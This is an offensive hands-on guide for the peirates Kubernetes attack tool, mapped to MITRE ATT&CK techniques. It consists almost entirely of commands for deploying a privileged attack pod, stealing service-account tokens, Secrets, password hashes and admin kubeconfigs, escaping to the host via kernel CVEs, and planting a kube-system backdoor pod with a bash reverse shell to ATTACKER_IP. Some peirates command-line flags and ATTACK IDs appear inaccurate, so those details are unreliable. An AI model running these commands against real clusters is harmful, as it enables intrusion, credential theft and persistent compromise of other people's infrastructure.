# peirates — Hands-On Use Cases

## Deploy peirates as a Pod inside the cluster

**MITRE ATT&CK:** T1610 (Deploy Container)

Create a Pod running peirates (attacker can also use kubectl apply):

```bash
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: peirates-pod
spec:
  serviceAccountName: default
  containers:
  - name: peirates
    image: golang:1.20-alpine  # Base image
    command: ["/bin/sh", "-c"]
    args:
    - |
      apk add --no-cache git build-base
      git clone https://github.com/aquasecurity/peirates.git /tmp/peirates
      cd /tmp/peirates && go build -o peirates .
      ./peirates
    securityContext:
      privileged: true
      capabilities:
        add:
        - ALL
EOF
```

Then exec into the Pod:

```bash
kubectl exec -it peirates-pod -- /bin/sh
```

## Read the in-cluster ServiceAccount token

**MITRE ATT&CK:** T1552.007 (Unsecured Credentials)

Once inside a container, peirates automatically reads:

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
```

## Check container capabilities and escape vectors

**MITRE ATT&CK:** T1611 (Escape to Host)

peirates probes for exploitable conditions:

```bash
# Inside peirates interactive menu, select:
# Option: "1" - Test if we can escape
# Option: "2" - Check capabilities

# Or directly:
peirates --list  # Show all available exploits
```

## Exploit kernel CVE for privilege escalation

**MITRE ATT&CK:** T1611 (Escape to Host), T1548.004 (Abuse Sudo)

If the kernel is vulnerable to Dirty COW or Netfilter vulnerability:

```bash
peirates --exploit dirty-cow
# Or
peirates --exploit cve-2021-22555
# Or (for recent runc)
peirates --exploit cve-2024-21626
```

## Mount host filesystem and access root

**MITRE ATT&CK:** T1611 (Escape to Host)

After escape, peirates can mount the host's root filesystem:

```bash
peirates --pod  # Attempt full exploitation and pivoting

# Manually: if hostPath: / mount is present
ls /host/
cat /host/root/.kube/config  # Extract admin kubeconfig
cat /host/etc/shadow  # Extract password hashes
```

## Create backdoor Pods for persistence

**MITRE ATT&CK:** T1610 (Deploy Container), T1053.006 (Scheduled Task)

After privilege escalation, use the elevated token to create new Pods:

```bash
peirates  # Interactive mode
# Option: "Create a backdoor Pod"
# Specify: reverse shell command, image, namespace

# Or manually with kubectl
kubectl run backdoor --image=alpine:latest \
  --restart=Always \
  -n kube-system \
  -- sh -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"
```

## RBAC escalation: create cluster-admin binding

**MITRE ATT&CK:** T1078.004 (Cloud Accounts)

If the compromised ServiceAccount has permission to create ClusterRoleBindings:

```bash
kubectl create clusterrolebinding backdoor-admin \
  --clusterrole=cluster-admin \
  --serviceaccount=default:default
```

Then extract kubeconfig and use it externally via kubectl.

## Lateral movement to another Pod

**MITRE ATT&CK:** T1610 (Deploy Container)

Once inside the cluster:

```bash
# List all Pods across namespaces (if RBAC allows)
kubectl get pods -A

# Exploit a running Pod to exec into it (if exec permission exists)
kubectl exec -it <TARGET_POD> -n <NAMESPACE> -- /bin/bash
```

## Extract and crack Secrets

**MITRE ATT&CK:** T1552.007 (Unsecured Credentials)

```bash
# Read all Secrets in all namespaces (if RBAC allows)
kubectl get secrets -A -o json | jq '.items[].data'

# Decode and crack
kubectl get secret <NAME> -n <NAMESPACE> -o jsonpath='{.data.password}' | base64 -d
```

## Copy kubeconfig from host and use externally

**MITRE ATT&CK:** T1611 (Escape to Host), T1552.007 (Unsecured Credentials)

After achieving node escape:

```bash
# Mount host filesystem
mount -o bind /host/root /mnt/root

# Copy kubeconfig to attacker's machine
scp root@target-node:/root/.kube/config ~/stolen-kubeconfig.conf

# Use externally
kubectl --kubeconfig ~/stolen-kubeconfig.conf get nodes
```
